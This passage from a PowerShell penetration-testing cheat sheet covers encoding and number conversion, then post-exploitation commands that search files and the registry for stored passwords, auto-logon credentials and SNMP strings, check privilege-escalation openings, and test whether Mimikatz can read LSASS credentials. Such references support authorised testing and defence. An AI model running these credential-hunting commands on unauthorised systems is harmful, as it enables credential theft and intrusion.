[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("<base64 string here>"))
```

**URL encode**

URL encoding \(also known as percent encoding\) is used to encode information in URIs and related web technologies \(e.g. `/` becomes `%2F`\).

```text
[System.Net.WebUtility]::UrlEncode('<text to encode>')
```

**URL decode**

```text
[System.Net.WebUtility]::UrlDecode('%3Ctext+to+decode%3E')
```

**HTML entities encode**

HTML encoding is used to convert characters that are disallowed in HTML, since they are part of the HTML language \(e.g. `<` becomes `&lt;`\)

```text
Add-Type -AssemblyName System.Web
[System.Web.HttpUtility]::HtmlEncode('<text to encode>')
```

**HTML entities decode**

```text
Add-Type -AssemblyName System.Web
[System.Web.HttpUtility]::HtmlDecode('&lt;text to decode&gt;')
```

**HTML entities encode \#2**

Alternate way in PowerShell 3.0 and above:

```text
[System.Net.WebUtility]::HtmlEncode('<text to encode>')
```

**HTML entities decode \#2**

```text
[System.Net.WebUtility]::HtmlDecode('&lt;text to decode&gt;')
```

### Number conversion <a id="number_conversion"></a>

**Decimal to Hex**

PowerShell:

```text
'{0:X}' -f 123456
[System.Convert]::ToString(123456, 16)
[System.String]::Format('{0:X}', 123456)
```

Linux equivalent:

```text
printf '%X\n' 123456
echo 'obase=16; 123456' | bc -lq
```

**Hex to Decimal**

PowerShell:

```text
'{0:d}' -f 0x1e240
[System.Convert]::ToString(0x1e240, 10)
[System.String]::Format('{0:d}', 0x1e240)
```

Linux equivalent:

```text
printf '%d\n' 0x1E240
echo $((0x1E240))
echo 'ibase=16; 1E240' | bc -lq
```

### Post-exploitation commands <a id="post-exploitation_commands"></a>

**Find recursively interesting file names**

```text
gci . -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue
```

**Find recursively sysprep or unattended files**

These files may contain plain text passwords.

```text
gci . -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue
```

**Find recursively configuration files, which contain string “password”**

```text
gci . -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"
```

**Find recursively web server configuration files**

Search for IIS, XAMPP, Apache, or PHP configuration files. These files may contain plain text passwords or other interesting information.

```text
gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue
```

**Search registry for auto-logon credentials**

```text
gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
```

**Check if AlwaysInstallElevated is enabled**

```text
gp 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated
gp 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated
```

**Find unquoted service paths**

```text
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Search for SNMP community string in registry**

```text
gci HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse -EA SilentlyContinue
```

**Search for password string in registry keys and values**

Search for password pattern recursively in all registry hives \(HKCR, HKCU, HKLM, HKU, and HKCC\):

```text
$pattern = "password"
$hives = "HKEY_CLASSES_ROOT","HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_USERS","HKEY_CURRENT_CONFIG"

# Search in registry keys
foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | sls "$pattern" }

# Search in registry values
foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" }}}
```

### Other useful commands <a id="other_useful_commands"></a>

**Check if WDigest caching is enabled \(LSASS\)**

This will either allow us or prevent us from retrieving clear text passwords from memory using Mimikatz.

```text
(gp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest).UseLogonCredential
```

* If the value is set to 0, then the caching is disabled and Mimikatz will be ineffective
* If it doesn’t exist or if it is set to 1, then the caching is enabled and Mimikatz will be able to retrieve credentials from LSASS process memory

### References <a id="references"></a>

* [https://www.infosecmatter.com/pure-powershell-infosec-cheatsheet/](https://www.infosecmatter.com/pure-powershell-infosec-cheatsheet/)

